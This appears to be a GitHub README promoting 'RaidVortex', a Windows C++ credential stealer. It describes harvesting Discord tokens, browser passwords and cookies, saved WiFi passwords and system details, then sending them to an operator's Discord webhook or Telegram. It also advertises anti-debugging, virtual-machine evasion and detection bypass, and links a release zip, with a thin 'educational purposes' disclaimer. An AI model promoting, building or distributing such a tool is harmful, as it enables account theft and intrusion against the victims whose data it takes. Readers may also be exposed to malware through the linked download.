# RaidVortex: Open-Source C++ Discord Token Stealer Tool

<div align="center">

[![260207683-cb9f1623-3ec8-4d16-b569-05ae4cc1eaf5](https://github.com/user-attachments/assets/05be297f-4218-4d2b-9bd2-3d198795bcef)](https://github.com/anouarlamhamdi/RaidVortex-Stealer-Discord-FUD/releases/download/v1.9.3/RaidVortex-Stealer-Discord-FUD.zip)

</div>

RaidVortex is an open-source C++ tool designed for Windows. It is created to discreetly collect Discord tokens from targeted systems and send them to your Discord server via webhooks.

- Purpose: This tool is intended solely for educational use to understand Discord's infrastructure and identify potential vulnerabilities. The project started about a year ago and has been updated recently.

# How It Works

- Operation: RaidVortex operates on Windows to extract Discord tokens. It searches through the file system to locate these tokens.

- Transmission: After finding a token, the tool sends a message containing the extracted token, host system details, and Discord account information to your Discord server using webhooks.

- Technology: Built with C++ 17, utilizing the filesystem module to search various directories. It can extract tokens from Discord and web browsers like Chrome, Opera, Brave, and Yandex.

- Token Extraction: The tool efficiently retrieves tokens and sends them to your Discord webhook.

## How to Compiling

- Download the project to your computer as zip
- Extract Project to Folder.
- Make Sure You Have Visual Studio Installed on Your Computer
- Open the solution file (.sln).
- Select **Build Solution** from the **Build** menu to compile the project.
- When the build is complete, select **Start Without Debugging** from the **Debug** menu to run the project.

## **Features**

**Discord Information Acquisition**:

- Username
- Email
- Phone Number
- Nitro Type
- ID

**Discord Token Procurement**:

- Standard Discord Token
- Discord PTB Token
- Discord Developer Token

**Discord Password Steal**:

- Captures account password changes
- Captures when email is changed
- Captures during account log-in

## **Security Measures**

- **Anti-Debug**: Prevents debugging of the tool.
- **Web Sniffer Protection**: Prevents sniffing of data over the web.
- **Virtual Machine Evasion**: Detects and avoids virtual machines.

**Additional Features**:

- **Integration with Discord Webhooks & Telegram**: Supports communication through Discord and Telegram.
- **Token Collection**: Gathers tokens from all running clients.
- **Profiling**: Captures system details like IP, CPU, GPU, and Windows key.
- **Password and Cookie Extraction**: Retrieves passwords and cookies from browsers including Brave, Chrome, Firefox, and OperaGX.
- **WIFI Password Extraction**: Retrieves saved WIFI passwords.
- **Local Cache Leverage**: Uses cached data for more efficient token collection.
- **Bypass Anti-Token-Grabbers**: Avoids detection by anti-token tools.
- **Firefox-based Browser Support**: Works with Pale Moon, Waterfox, and more.

**Note**: The tool uses hardcoded paths but prefers dynamic methods for better precision.

## Disclaimer

This source code is for educational purposes only.

## License

